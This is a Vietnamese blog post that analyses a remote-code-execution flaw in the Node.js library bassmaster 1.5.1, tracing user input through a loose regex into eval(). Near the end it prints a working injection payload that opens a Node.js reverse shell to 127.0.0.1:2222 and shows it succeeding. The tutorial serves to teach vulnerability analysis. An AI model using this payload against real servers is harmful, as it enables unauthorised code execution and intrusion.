![](https://images.viblo.asia/8c953486-884e-4799-9dea-c979b3653299.png)

Muốn học một thứ gì đó mới thực sự không có gì khó mà chỉ là quá khó. Và điều đó còn tùy thuộc vào bản thân người tìm hiểu, độ khó của vấn đề cần tìm hiểu và nhiều yếu tố khách quan khác. Do đó chỉ còn cách là hãy đi vào tìm hiểu nó, tìm hiểu đến khi nào hiểu ra vấn đề thì thôi :joy:

Bassmaster cũng vậy, lúc đầu mới đụng vào thì cũng chẳng hiểu gì, nhưng cứ đọc, nghiên cứu và thực hành thì cuối cùng cũng hiểu ra. Khi tìm kiếm trên bassmaster trên google thì cũng không thấy đâu mà phải tìm với từ khóa bassmaster github thì mới thấy được. Trong bài, ta sẽ phân tích vì sao bassmaster có lỗi RCE và cùng thực hành khai thác sau khi đã hiểu vấn đề.

khi tìm hiểu công nghệ mới, điều đầu tiên là tìm hiểu nó là cái gì? Và dùng để làm gì?

> Bassmaster makes it easy to combine requests into a single one. It also supports pipelining, allowing you to take the result of one query in the batch request and use it in a subsequent one. The batch endpoint only responds to POST requests.

Trên là phần tự giới thiệu về sản phẩm của bassmaster. Hiểu nôm na là bassmaster cho phép ta thực hiện gộp nhiều requests trong một requests. Ta cứ hình dung như thay vì đưa từng chiếc đũa một thì ta đưa cả bó đũa cho người khác.

# Tìm lỗi RCE
Bassmaster code bằng nodejs và trong version 1.5.1 tồn tại lỗ hổng RCE cho phép kẻ tấn công thực thi mã tùy ý trên server. Do source đã có sẵn nên ta sẽ đi vào phân tích code để tìm ra lỗ hổng. Như đã nói ở trên, bassmaster code bằng nodejs nên ta sẽ tìm những hàm có thể sử dụng để thực thi mã trên server như là **eval**. Cách đơn giản nhất trong tìm các hàm nguy hiểm là sử dụng grep để tìm kiếm.

```bash
grep --color -rnw ./
```

![](https://images.viblo.asia/f423cf6b-e964-44e4-bd20-5b0a36c96de5.png)

Như kết quả ở trên hình, ta thấy có vài kết quả khả nghi nhưng ta thấy kết quả đầu tiên là có vè đáng ngờ nhất. Do đó, ta sẽ đi vào phần tích file **./lib/batch.js** và sẽ bắt đầu từ dòng **152**.
```javascript
internals.batch = function (batchRequest, resultsData, pos, parts, callback) {
    var error = null;

    for (var i = 0, il = parts.length; i < il; ++i) {
        path += '/';

        if (parts[i].type === 'ref') {
            var ref = resultsData.resultsMap[parts[i].index];

            if (ref) {
                var value = null;

                try {
                    eval('value = ref.' + parts[i].value + ';');
                }
                catch (e) {
                    error = new Error(e.message);
                }
                ...
```

Hàm **eval** nằm trong nhánh **TRUE** câu lệnh **if..else** vì vậy muốn thực thi được hàm này cần phải biết được khi nào thì chương trình đi vào nhánh **TRUE**. Ta để ý thấy **internals.batch** được gán bằng hàm chứa lệnh **eval**, do đó ta trace ngược code xem có nơi nào gọi **internals.batch**. Khi đi ngược lên trên ta thấy ngay lời gọi **internals.batch** nằm trong đoạn code sau
```javascript
internals.process = function (request, requests, resultsData, reply) {

    var fnsParallel = [];
    var fnsSerial = [];
    var callBatch = function (pos, parts) {

        return function (callback) {
            //console.log("calling the batch function!");
            internals.batch(request, resultsData, pos, parts, callback);
        };
    };

    for (var i = 0, il = requests.length; i < il; ++i) {
        var parts = requests[i];

        if (internals.hasRefPart(parts)) {
            fnsSerial.push(callBatch(i, parts));
        }
        else {
            fnsParallel.push(callBatch(i, parts));
        }
    }
...
```

Nơi gọi hàm **internals.batch** là hàm **internals.process**, ta tiếp tục trace tiếp để tìm được nơi gọi hàm **internals.process**. Sau khi đi lên một đoạn ta đã thấy ngay được lời gọi hàm **internals.process** nằm trong **module.exports.config**
```javascript
module.exports.config = function (settings) {

    return {
        handler: function (request, reply) {

            var resultsData = {
                results: [],
                resultsMap: []
            };

            var requests = [];
            var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g;       // /project/$1.project/tasks, does not allow using array responses

            // Validate requests

            var errorMessage = null;
            var parseRequest = function ($0, $1, $2) {

                if ($1) {
                    if ($1 < i) {
                        parts.push({ type: 'ref', index: $1, value: $2 });
                        return '';
                    }
                    else {
                        errorMessage = 'Request reference is beyond array size: ' + i;
                        return $0;
                    }
                }
                else {
                    parts.push({ type: 'text', value: $2 });
                    return '';
                }
            };

            if (!request.payload.requests) {
                return reply(Boom.badRequest('Request missing requests array'));
            }

            for (var i = 0, il = request.payload.requests.length; i < il; ++i) {

                // Break into parts

                var parts = [];
                var result = request.payload.requests[i].path.replace(requestRegex, parseRequest);

                // Make sure entire string was processed (empty)

                if (result === '') {
                    requests.push(parts);
                }
                else {
                    errorMessage = errorMessage || 'Invalid request format in item: ' + i;
                    break;
                }
            }

            if (errorMessage === null) {
                internals.process(request, requests, resultsData, reply);
            }
            else {
                reply(Boom.badRequest(errorMessage));
            }
        },
        description: settings.description,
        tags: settings.tags
    };
};
```

Ta nhận thấy rằng để có thể gọi hàm **internals.process** thì **errorMessage** phải bằng **null**. Biến **errorMessage** được gán trong vòng lặp khi phát hiện lỗi và trong hàm **parseRequest** khi URL không hợp lệ. Trong vòng lặp for gọi hàm **replace** với 2 tham số, tham số đầu là pattern, tham số thứ 2 là hàm xử lý sau khi khớp chuỗi với pattern.

## Hàm replace
Để hiểu hơn về luồng thực thi của chương trình cần phải phân tích rõ hơn về hoạt động của hàm replace. Đặc biệt là trường hợp tham số thứ 1 là một chuỗi regex và tham số thứ 2 là một hàm. Sau khi đọc tài liệu về hàm này trên MDN ([**link**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_function_as_a_parameter)) liền hiểu ra rằng, hàm chuyền vào sẽ được gọi sau khi thực hiện khớp chuỗi ban đầu với chuỗi regex và kết quả sẽ chuyền vào cho tham thông qua các tham số của hàm.

> You can specify a function as the second parameter. In this case, the function will be invoked after the match has been performed. The function's result (return value) will be used as the replacement string. 

> Note that the function will be invoked multiple times for each full match to be replaced if the regular expression in the first parameter is global.

Tham số truyền vào cho hàm được mô tả trong bảng sau
![](https://images.viblo.asia/95f35fe7-af28-45a9-9a9a-20e038acd3db.png)

Phần code của bassmaster
```javascript
var parseRequest = function ($0, $1, $2) {
```
Đối chiếu với bảng bên trên ta có thể hiểu được ý nghĩa các tham số: **$0**, **$1**, **$2**
+ **$0**: Toàn bộ chuỗi khớp với regex
+ **$1**: chuỗi group 1
+ **$2**: chuỗi group 2

Ta để ý vào hàm **parseRequest**, đây là hàm cuối cùng có gán giá trị **type: 'ref'** vào kết quả và là điều kiện thực thi được hàm **eval**.

```javascript
parts.push({ type: 'ref', index: $1, value: $2 });
```

Để có thể thêm **type: 'ref'** thì **$1** phải khác **null**, mà **$1** là group 1 của regex. Khi ta truyền dữ liệu như dưới vào thì **$1** sẽ khác **null**
```javascript
/item/$1.id
```

Sau khi đã thêm **type: 'ref'** và parts thì ta đã có thể thực hiện được hàm **eval**.
```javascript
eval('value = ref.' + parts[i].value + ';');
```
**value** được gán bằng **$2** (chính là group 2 của regex) ở trên. Khi ta truyền `/item/$1.id` thì **value** ở đây là `id`

## Regex sử dụng không chặt chẽ
Bassmaster đã sử dụng regex để lọc những path hợp lệ. Nhưng Regex này không đủ chặt chẽ, cho phép người dùng bypass từ đó có thể thực thi mã tùy ý trên server. Do đó ta sẽ đi vào phân tích pattern mà bassmaster đã sử dụng.
```regex
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
```
Mục đích của regex bên trên đã được nói rõ trong source code
> /project/$1.project/tasks, does not allow using array


Data gửi lên server theo kiểu json và có dạng như sau (mẫu lấy từ trong file **example/batch.js**)
```text
payload: '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'
```

![](https://images.viblo.asia/f603bc05-d0ce-4e64-9c8a-13fae0c00a19.png)

Như đã nói bên trên nếu ta truyền thì hàm **eval** sẽ nhận chuỗi **id** làm tham số.
```regex
/item/$1.id
```

![](https://images.viblo.asia/433ca9cf-2894-4235-a22c-762af7be5f09.png)

Vấn đề đặt ra là nếu ta có chèn thêm các giá trị khác thì ta có thể thực thi mã tùy ý. Trong javascript, ngăn cách giữ các câu lệnh ta sử dụng dấu chấm phẩy (**;**) nên ta sẽ sử dụng nó để bypass regex từ đó có thể thực thi mã javascript.

```javascript
;var net=require('net'), sh=require('child_process').exec('\\x2fbin\\x2fbash');var client=new net.Socket();client.connect(2222,'127.0.0.1',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

![](https://images.viblo.asia/637a0747-bf9e-4a03-8c18-0760bd9a4654.png)

Với đoạn mã javascript trên thì đã đã có thể bypass regex và thực hiện được reverse shell.

![](https://images.viblo.asia/490de4b5-7c57-450b-828b-d8adcc6a1fa1.png)

Sử dụng mã khai thác bên trên đã thành công tạo reverse shell.

![](https://images.viblo.asia/e213379c-d758-446d-82da-8de4e3f0ed9f.png)